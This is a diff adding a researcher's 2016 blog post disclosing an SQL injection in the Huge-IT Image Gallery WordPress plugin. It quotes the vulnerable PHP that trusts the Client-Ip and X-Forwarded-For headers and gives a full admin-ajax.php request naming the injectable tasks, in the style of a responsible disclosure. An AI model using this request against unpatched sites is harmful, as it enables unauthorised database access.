@@ -1,0 +1,321 @@
+<!doctype html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
+<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
+<head>
+<meta charset="utf-8">
+<title>Image Gallery SQL Injection &#8211; Gwendal Le Coguic</title>
+<meta name="description" content="Gwendal Le Coguic, web developer and security researcher">
+<meta name="keywords" content="wordpress, sql injection">
+
+<!-- Twitter Cards --><meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://10degres.net/assets/img/header-background.jpg">
+<meta name="twitter:title" content="Image Gallery SQL Injection">
+<meta name="twitter:description" content="Gwendal Le Coguic, web developer and security researcher">
+<meta name="twitter:creator" content="@gwendallecoguic">
+
+<!-- Open Graph -->
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Image Gallery SQL Injection">
+<meta property="og:description" content="Gwendal Le Coguic, web developer and security researcher">
+<meta property="og:url" content="http://10degres.net/image-gallery-sql-injection/">
+<meta property="og:site_name" content="Gwendal Le Coguic">
+<meta property="og:image" content="http://10degres.net/assets/img/header-background.jpg">
+
+
+<meta name="google-site-verification" content="GnoFwHUV3XNgLy4D-7XjLQ0Dbw6fKBXZnBzMn-0GBX8">
+
+
+
+<link rel="canonical" href="http://10degres.net/image-gallery-sql-injection/">
+<link href="http://10degres.net/feed.xml" type="application/atom+xml" rel="alternate" title="Gwendal Le Coguic Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="http://10degres.net/assets/css/main.css">
+<!-- Webfonts -->
+<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">
+
+<meta http-equiv="cleartype" content="on">
+
+<!-- Load Modernizr -->
+<script src="http://10degres.net/assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>
+
+<!-- Icons -->
+<!-- 16x16 -->
+<link rel="shortcut icon" href="http://10degres.net/favicon.ico">
+<!-- 32x32 -->
+<link rel="shortcut icon" href="http://10degres.net/favicon.png">
+
+
+
+</head>
+
+<body id="post" class="feature">
+
+<!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
+<nav id="dl-menu" class="dl-menuwrapper" role="navigation">
+	<button class="dl-trigger">Open Menu</button>
+	<ul class="dl-menu">
+		<li><a href="http://10degres.net/">Home</a></li>
+		<li>
+			<a href="#">About</a>
+			<ul class="dl-submenu">
+				<li>
+					<img src="http://10degres.net/assets/img/me.jpg" alt="Gwen photo" class="author-photo">
+					<h4>Gwen</h4>
+					<p>Web developer reconverted to security researcher, playing bug bounty sometimes :)</p>
+				</li>
+				<li><a href="http://10degres.net/about/"><span class="btn btn-inverse">Learn More</span></a></li>
+				<li>
+					<a href="mailto:g@10degres.net"><i class="fa fa-fw fa-envelope"></i> Email</a>
+				</li>
+				<li>
+					<a href="https://twitter.com/gwendallecoguic" target="_blank"><i class="fa fa-fw fa-twitter"></i> Twitter</a>
+				</li>
+				
+				
+				<li>
+					<a href="https://linkedin.com/in/gwendal-le-coguic-77106729" target="_blank"><i class="fa fa-fw fa-linkedin"></i> LinkedIn</a>
+				</li>
+				<li>
+					<a href="https://github.com/gwen001" target="_blank"><i class="fa fa-fw fa-github"></i> GitHub</a>
+				</li>
+				
+				
+				
+				
+			</ul><!-- /.dl-submenu -->
+		</li>
+		<li>
+			<a href="#">Posts</a>
+			<ul class="dl-submenu">
+				<li><a href="http://10degres.net/posts/">All Posts</a></li>
+				<li><a href="http://10degres.net/tags/">All Tags</a></li>
+			</ul>
+		</li>
+		
+	</ul><!-- /.dl-menu -->
+</nav><!-- /.dl-menuwrapper -->
+
+
+
+<div class="entry-header">
+  
+  <div class="entry-image">
+    <img src="http://10degres.net/assets/img/header-background.jpg" alt="Image Gallery SQL Injection">
+  </div><!-- /.entry-image -->
+</div><!-- /.entry-header -->
+
+
+<div id="main" role="main">
+  <article class="hentry">
+    <header class="header-title">
+      <div class="header-title-wrap">
+        
+          <h1 class="entry-title"><a href="http://10degres.net/image-gallery-sql-injection/" rel="bookmark" title="Image Gallery SQL Injection">Image Gallery SQL Injection</a></h1>
+        
+        <h2><span class="entry-date date published"><time datetime="2016-05-20T00:00:00+01:00">May 20, 2016</time></span></h2>
+        
+      </div><!-- /.header-title-wrap -->
+    </header>
+    <div class="entry-content">
+      <p>While I was working on a famous bug bounty program, WPScan returns me the list of the plugins configured on the Wordpress install.
+Here is what I found in one of them: <a href="https://wordpress.org/plugins/gallery-images/" class="flashlink" target="_blank">Image Gallery by Huge-IT</a>.</p>
+
+<p>WPScan output, no issues known:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>[+] Name: gallery-images - v1.8.6  
+ |  Location: https://[REDACTED]/wp-content/plugins/gallery-images/  
+ |  Readme: https://[REDACTED]/wp-content/plugins/gallery-images/readme.txt  
+</code></pre>
+</div>
+
+<p>After a fast search on <a href="https://www.exploit-db.com/" target="_blank">exploit-db.com</a> with no success, I finally decided to download it and read the code to find vulnerabilites by myself.
+Since the readme was available, I was able to confirm the version of the plugin.</p>
+
+<p>I was looking for two kind of vulnerabilities: file upload and sql injection.
+First thing I did was to locate PHP files, and grepping the result to find <code class="highlighter-rouge">Content-Disposition</code> header:</p>
+
+<div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span>find . -name <span class="s2">"*.php*"</span> | xargs grep -i header
+./Front_end/gallery_front_end_view.php:							header<span class="o">(</span><span class="s2">"Location:"</span>.<span class="nv">$actual_link</span>.<span class="s2">""</span><span class="o">)</span>;
+./Front_end/gallery_front_end_view.php:							header<span class="o">(</span><span class="s2">"Location:"</span>.<span class="nv">$actual_link</span>.<span class="s2">""</span><span class="o">)</span>;
+./Front_end/gallery_front_end_view.php:							header<span class="o">(</span><span class="s2">"Location:"</span>.<span class="nv">$actual_link</span>.<span class="s2">""</span><span class="o">)</span>;
+./Front_end/gallery_front_end_view.php:							header<span class="o">(</span><span class="s2">"Location:"</span>.<span class="nv">$actual_link</span>.<span class="s2">""</span><span class="o">)</span>;
+./Front_end/gallery_front_end_view.php:		/<span class="k">*</span>HEIGHT FROM HEADER.PHP<span class="k">*</span>/
+./Front_end/gallery_front_end_view.php:							header<span class="o">(</span><span class="s2">"Location:"</span>.<span class="nv">$actual_link</span>.<span class="s2">""</span><span class="o">)</span>;
+./Front_end/gallery_front_end_view.php:							header<span class="o">(</span><span class="s2">"Location:"</span>.<span class="nv">$actual_link</span>.<span class="s2">""</span><span class="o">)</span>;
+./Front_end/gallery_front_end_view.php:							header<span class="o">(</span><span class="s2">"Location:"</span>.<span class="nv">$actual_link</span>.<span class="s2">""</span><span class="o">)</span>;
+./Front_end/gallery_front_end_view.php:							header<span class="o">(</span><span class="s2">"Location:"</span>.<span class="nv">$actual_link</span>.<span class="s2">""</span><span class="o">)</span>;
+./Front_end/gallery_front_end_view.php:							header<span class="o">(</span><span class="s2">"Location:"</span>.<span class="nv">$actual_link</span>.<span class="s2">""</span><span class="o">)</span>;
+./Front_end/gallery_front_end_view.php:							header<span class="o">(</span><span class="s2">"Location:"</span>.<span class="nv">$actual_link</span>.<span class="s2">""</span><span class="o">)</span>;
+./admin/gallery_func.php:			header<span class="o">(</span><span class="s1">'Location: admin.php?page=gallerys_huge_it_gallery&amp;id='</span>.<span class="nv">$rowsldccs</span>-&gt;id.<span class="s1">'&amp;task=apply'</span><span class="o">)</span>;
+./admin/gallery_view.php:	header<span class="o">(</span><span class="s1">'Location: admin.php?page=gallerys_huge_it_gallery&amp;id='</span>.<span class="nv">$row</span>-&gt;id.<span class="s1">'&amp;task=apply'</span><span class="o">)</span>;
+./admin/gallery_view.php:	&lt;div <span class="nv">id</span><span class="o">=</span><span class="s2">"gallery-header"</span>&gt;
+</code></pre>
+</div>
+<!--more-->
+
+<p>Nothing interesting here…</p>
+
+<p>Then, I noticed that the “non admin” requests where mainly coded in two files: <code class="highlighter-rouge">gallery-images.php</code> and <code class="highlighter-rouge">Front_end/gallery_front_end_view.php</code>.
+Luckily I started to read the first one which contains the hole.</p>
+
+<p>In the function <code class="highlighter-rouge">huge_it_image_gallery_ajax_callback</code>, the variable <code class="highlighter-rouge">$huge_it_ip</code> is used multiple times in the following form:</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code>$wpdb-&gt;prepare("SELECT `image_status`,`ip` FROM ".$wpdb-&gt;prefix."huge_itgallery_like_dislike WHERE image_id = %d AND `ip` = '".$huge_it_ip."'",(int)$row-&gt;id);
+</code></pre>
+</div>
+
+<p>This variable is defined at the top of the file:</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code>if(!empty($_SERVER['HTTP_CLIENT_IP'])){
+	$huge_it_ip=$_SERVER['HTTP_CLIENT_IP'];
+}
+elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
+	$huge_it_ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
+}
+else{
+	$huge_it_ip=$_SERVER['REMOTE_ADDR'];
+}
+</code></pre>
+</div>
+
+<p>Unfortunately HTTP headers cannot be trusted, even ip address.
+So I started to test the injection in <code class="highlighter-rouge">X-Forwarded-For</code> header and it worked perfectly on my local install.
+However the site I was testing seems to had a firewall who drop this header. 
+I then tested the injection in <code class="highlighter-rouge">Client-Ip</code> header and it passed !</p>
+
+<p>Note that the plugin must be enabled to be able to exploit the injection.
+Finally here is the full request in Burp Suite:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: local.wordpress.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.8.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://local.wordpress.com/wp-admin/admin.php?page=gallerys_huge_it_gallery&amp;task=edit_cat&amp;id=1
+Content-Length: 89
+Client-Ip: 123.123.123.123
+Cookie: wordpress_3e0ed6e299d95d3a38b8516e25f1b1e2=admin%7C1463913228%7CYRWrxl5s69SoSkkXyMBFnXzSt2dSINk63ojC6F0mcWJ%7Cb28be90ae8a75452f047cb21fcc84f42a9a801123af24c1f77bb3f19c880147b; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_3e0ed6e299d95d3a38b8516e25f1b1e2=admin%7C1463913228%7CYRWrxl5s69SoSkkXyMBFnXzSt2dSINk63ojC6F0mcWJ%7C243730f21ebdc724e25dd292d6c8d1773510dd572a0a39abc88b379852181f1f; wp-settings-1=libraryContent%3Dbrowse%26editor%3Dtinymce; wp-settings-time-1=1463740430; PHPSESSID=e5a63r274m6mvcfbmblgacrvq0
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+action=huge_it_video_gallery_ajax&amp;task=load_images_content&amp;galleryid=1&amp;page=1&amp;perpage=100
+</code></pre>
+</div>
+
+<p>The parameter <code class="highlighter-rouge">task</code> can be one of the following:<br />
+load_images_content<br />
+load_images_lightbox<br />
+load_image_justified<br />
+load_image_thumbnail<br />
+load_blog_view</p>
+
+<p>And the result:
+<a href="/images/image-gallery-sql-injection.png"><img src="/images/image-gallery-sql-injection.png" alt="sqlmap injection" /></a></p>
+
+<p>A Full Path Disclosure is also available if you call <code class="highlighter-rouge">http://www.example.com/wp-content/plugins/gallery-images/gallery-images.php</code></p>
+
+<p>I sent an email to Huge-IT who released a fix the same day. Fast enough :)</p>
+
+      <footer class="entry-meta">
+        <span class="entry-tags"><a href="http://10degres.net/tags/#wordpress" title="Pages tagged wordpress" class="tag"><span class="term">wordpress</span></a><a href="http://10degres.net/tags/#sql injection" title="Pages tagged sql injection" class="tag"><span class="term">sql injection</span></a></span>
+        
+        <div class="social-share">
+  <ul class="socialcount socialcount-small inline-list">
+    <li class="facebook"><a href="https://www.facebook.com/sharer/sharer.php?u=http://10degres.net/image-gallery-sql-injection/" title="Share on Facebook"><span class="count"><i class="fa fa-facebook-square"></i> Like</span></a></li>
+    <li class="twitter"><a href="https://twitter.com/intent/tweet?text=http://10degres.net/image-gallery-sql-injection/" title="Share on Twitter"><span class="count"><i class="fa fa-twitter-square"></i> Tweet</span></a></li>
+    <li class="googleplus"><a href="https://plus.google.com/share?url=http://10degres.net/image-gallery-sql-injection/" title="Share on Google Plus"><span class="count"><i class="fa fa-google-plus-square"></i> +1</span></a></li>
+  </ul>
+</div><!-- /.social-share -->
+      </footer>
+    </div><!-- /.entry-content -->
+    
+    <div class="see-also">
+	<div class="see-also-header">
+		<a href="javascript:;" class="see-also-btn">See Also</a>
+	</div><!-- /.see-also-header -->
+	<article>
+		<ul>
+			
+				
+					<li class="entry-title"><a href="http://huge-it.com/wordpress-gallery/" target="_blank">Huge-IT website</a></li>
+				
+			
+		</ul>
+	</article>
+</div><!-- /.see-also -->
+
+    
+
+<div class="read-more">
+  
+    <div class="read-more-header">
+      <a href="javascript:;" class="read-more-btn">Read More</a>
+    </div><!-- /.read-more-header -->
+    <div class="read-more-content">
+      <h3><a href="http://10degres.net/subdomain-enumeration/" title="Subdomain enumeration">Subdomain enumeration</a></h3>
+      <p>A friend recently asked me what methods I use to find subdomains.To be honest I was confused, like *"oooohhh so much, brute force mmm... ...&hellip; <a href="http://10degres.net/subdomain-enumeration/">Continue reading</a></p>
+    </div><!-- /.read-more-content -->
+  
+  <div class="read-more-list">
+	  <div class="list-item">
+		  
+			<h4><a href="/github-search/">&laquo; GitHub search</a></h4>
+			<span>Published on September 06, 2016</span>
+		  
+	  </div><!-- /.list-item -->
+	  <div class="list-item">
+		
+			<h4><a href="/playing-with-s3-buckets/">Playing with S3 buckets &raquo; </a></h4>
+			<span>Published on April 15, 2016</span>
+		
+	  </div><!-- /.list-item -->
+  </div><!-- /.read-more-list -->
+</div><!-- /.read-more -->
+
+  </article>
+</div><!-- /#main -->
+
+<div class="footer-wrapper">
+  <footer role="contentinfo">
+    <span>&copy; 2018 Gwendal Le Coguic</span>
+
+  </footer>
+</div><!-- /.footer-wrapper -->
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script>window.jQuery || document.write('<script src="http://10degres.net/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
+<script src="http://10degres.net/assets/js/scripts.min.js"></script>
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-61485350-1', 'auto');  
+  ga('require', 'linkid', 'linkid.js');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+	        
+
+</body>
+</html>
